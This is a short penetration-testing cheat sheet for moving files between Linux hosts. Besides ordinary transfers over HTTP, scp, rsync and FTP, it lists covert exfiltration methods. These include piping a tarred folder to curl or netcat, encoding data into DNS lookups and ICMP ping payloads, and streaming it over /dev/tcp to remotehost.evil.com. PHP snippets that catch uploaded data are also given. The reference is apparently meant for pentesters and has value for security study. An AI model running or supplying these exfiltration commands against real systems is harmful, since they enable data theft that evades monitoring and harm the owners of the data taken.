####Linux
#####HTTP
######Copying file to host
+ On the source machine open a webserver on the directory of the file you want    
`python -m SimpleHTTPServer 80`

+ On the destination machine (Use -O to write to a different directory)    
`wget [-O /tmp/<file>] <source ip>/<file>`    
Change permissions if necessary    
`chmod a+x /tmp/<file>`

######Copying file from host  
+ On the destination machine run `SimpleHTTPServer` and use this php code:
```php
<?php file_put_contents('test.txt', file_get_contents('php://input')); ?>
```
-or-
```php
<?php $content = $_POST['content']; $file = "text.txt";
$Saved_File = fopen($file, 'w'); fwrite($Saved_File, $content); fclose($Saved_File); ?>
```

+ On the source machine    
`tar zcf - localfolder | curl -F "data=@-" <source ip>/<file>`

######-or-
+ On the destination machine
```php
<?php print_r($_FILES); move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]); ?>
```

+ On the source machine    
[web_upload.py](../utils/web_upload.py)

#####SSH
+ Copying file to host    
`scp [-P <port>] <SourceFile> user@<host>:<directory/TargetFile>`    
-or-    
`tar zcf - <localfolder> | ssh [-P <port>] <host> "cd <directory/TargetFile>; tar zxpf -"`

+ Copying file from host    
`scp [-P <port>] user@host:<directory/SourceFile> <TargetFile>`    
`scp -r [-P <port>] user@host:<directory/SourceFolder> <TargetFolder>`

#####rsync
+ Copying file to host
`rsync -aH [--port <port>] localhost <host>:<directory/TargetFile>`

#####netcat
+ On the source machine    
`nc -nv <dest ip> <port> < <filename>`

+ On the destination machine    
`nc -nlvp <port> > <filename>`

#####FTP
+ On the source machine on the directory of the file you want    
`python -m pyftpdlib`

+ On the destination macine
```
echo open <ip> 21 > ftp.txt
echo <user> >> ftp.txt
echo <password> >> ftp.txt
echo bin >> ftp.txt
echo GET <file> >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

#####DNS
+ On the source machine
```bash
xxd -p <file> > file.hex
for b in `cat file.hex`;do dig $b.shell.domain.com; done
```
or a tarbal    
```bash
tar zcf - localfolder | xxd -p -c 16 |
    while read line; do host $line.domain.com <destination host>; done
```
+ On the destination machine
```bash
tcpdump -w /tmp/dns -s0 port 53 and host system.domain.com
tcpdump -r dnsdemo -n | grep shell.domain.com | cut -f9 -d' ' | cut -f1 -d'.' | uniq > received.txt
xxd -r -p < received.txt > file
```

#####ICMP
+ On the source machine
```bash
tar zcf - localfolder | xxd -p -c 16 |
    while read line; do ping -p $line -c 1 -q <destination host>; done
```

#####Raw mode
+ On the source machine
`tar zcf - localfolder >/dev/tcp/<host>/443`    
or encoded, use `xxd -r` on the destination    
`tar zcf - localfolder | xxd -p >/dev/tcp/remotehost.evil.com/443`    
or encoded, use `dd conv=ascii if=filename | base64 -d` on the destination    
`tar zcf - localfolder | base 64 | dd conv=ebcdic >/dev/tcp/remotehost.evil.com/443`

####FreeBSD
Fetch

####Links
http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html
